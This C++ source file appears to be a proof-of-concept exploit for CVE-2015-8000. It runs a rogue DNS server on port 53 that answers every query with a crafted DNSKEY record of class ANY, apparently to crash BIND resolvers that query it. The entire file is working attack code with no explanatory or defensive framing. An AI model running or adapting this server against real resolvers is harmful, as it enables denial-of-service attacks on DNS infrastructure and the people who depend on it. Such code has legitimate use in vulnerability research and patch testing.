#include "dns_server.hpp"
#include <boost/program_options.hpp>
#include <iostream>

const int   TTL          = 600;
const char *BIND_ADDRESS = "192.168.33.1";

class CVE20158000Server : public dns::DNSServer
{
private:
    std::string cache_address;
    std::string base64_dnskey;
    uint8_t     algorithm;

public:
    CVE20158000Server( const std::string &addr, uint16_t port, const std::string &dnskey, uint8_t algo )
        : dns::DNSServer( addr, port ), base64_dnskey( dnskey ), algorithm( algo )
    {
    }

    dns::PacketInfo generateResponse( const dns::PacketInfo &query, bool via_tcp )
    {
        dns::PacketInfo           response;
        dns::QuestionSectionEntry query_question = query.question_section[ 0 ];

        dns::QuestionSectionEntry question1;
        question1.q_domainname = query_question.q_domainname;
        question1.q_type       = query_question.q_type;
        question1.q_class      = query_question.q_class;
        response.question_section.push_back( question1 );

        PacketData signed_key;
        signed_key.resize( decode_from_base64_size( &base64_dnskey[ 0 ], &base64_dnskey[ 0 ] + base64_dnskey.size() ) );
        decode_from_base64( &base64_dnskey[ 0 ], &base64_dnskey[ 0 ] + base64_dnskey.size(), &signed_key[ 0 ] );

        dns::ResourceRecord answer;
        answer.r_domainname = query_question.q_domainname;
        answer.r_type       = dns::TYPE_DNSKEY;
        answer.r_class      = dns::CLASS_ANY;
        answer.r_ttl        = TTL;
        answer.r_resource_data =
            dns::RDATAPtr( new dns::RecordDNSKEY( dns::RecordDNSKEY::SIGNED_KEY, algorithm, signed_key ) );
        response.answer_section.push_back( answer );

        response.id                   = query.id;
        response.opcode               = 0;
        response.query_response       = 1;
        response.authoritative_answer = 1;
        response.truncation           = 0;
        response.recursion_desired    = 0;
        response.recursion_available  = 0;
        response.zero_field           = 0;
        response.authentic_data       = 1;
        response.checking_disabled    = 1;
        response.response_code        = dns::NO_ERROR;

        return response;
    }
};

int main( int argc, char **argv )
{
    namespace po = boost::program_options;

    std::string bind_address;
    std::string cache_address;
    std::string dnskey;
    uint8_t     algorithm;

    po::options_description desc( "CVE-2015-8000" );
    desc.add_options()( "help,h", "print this message" )

        ( "bind,b", po::value<std::string>( &bind_address )->default_value( BIND_ADDRESS ), "bind address" )

            ( "dnskey,d", po::value<std::string>( &dnskey ), "dnskey(base64)" )

                ( "algorithm,a", po::value<uint8_t>( &algorithm ), "algorithm" )

        ;

    po::variables_map vm;
    po::store( po::parse_command_line( argc, argv, desc ), vm );
    po::notify( vm );

    if ( vm.count( "help" ) ) {
        std::cerr << desc << "\n";
        return 1;
    }

    CVE20158000Server server( bind_address, 53, dnskey, algorithm );
    server.start();

    return 0;
}
